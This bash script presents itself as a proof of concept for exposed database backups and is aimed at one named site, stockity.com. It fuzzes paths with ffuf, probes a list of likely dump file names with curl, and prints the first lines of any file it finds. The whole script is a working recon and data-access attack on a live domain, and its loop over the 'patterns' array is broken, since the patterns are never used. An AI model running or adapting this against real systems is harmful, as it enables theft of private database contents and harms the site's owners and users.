#!/bin/bash
# Database Backup File Exposure PoC

echo "[*] Scanning for database backup files..."

# Common backup patterns
patterns=(
    "*.sql"
    "*.sql.gz"
    "*.sql.bak"
    "*.sql.old"
    "*.sql.tar"
    "*.sql.zip"
    "backup*.sql"
    "db*.sql"
    "database*.sql"
    "dump*.sql"
    "export*.sql"
    "mysql*.sql"
    "data*.sql"
    "*.dump"
)

# Generate wordlist of common backup names
for pattern in "${patterns[@]}"; do
    ffuf -u "https://stockity.com/FUZZ" \
         -w <(seq -f "backup-%g.sql" 1 10) \
         -mc 200 -t 20 -of csv -o ffuf-backup.csv 2>/dev/null
done

# Direct access test
echo "[*] Testing direct access to known backup files:"
backup_files=(
    "backup.sql"
    "db.sql"
    "database.sql"
    "dump.sql"
    "mysql.sql"
    "data.sql"
    "prod.sql"
    "production.sql"
    "live.sql"
    "2024-03-08.sql"
    "stockity.sql"
    "stockity_backup.sql"
    "db_backup.sql"
    "db_backup.tar.gz"
    "db_backup.zip"
    "backup.tar"
    "backup.zip"
    "backup.gz"
)

for file in "${backup_files[@]}"; do
    size=$(curl -s -I "https://stockity.com/$file" | grep -i content-length | awk '{print $2}')
    if [ -n "$size" ] && [ "$size" -gt 1000 ]; then
        echo "[✓] FOUND: $file (Size: $size bytes)"
        # Download first 5 lines to verify
        echo "    First 5 lines:"
        curl -s "https://stockity.com/$file" | head -5 | sed 's/^/    /'
    fi
done
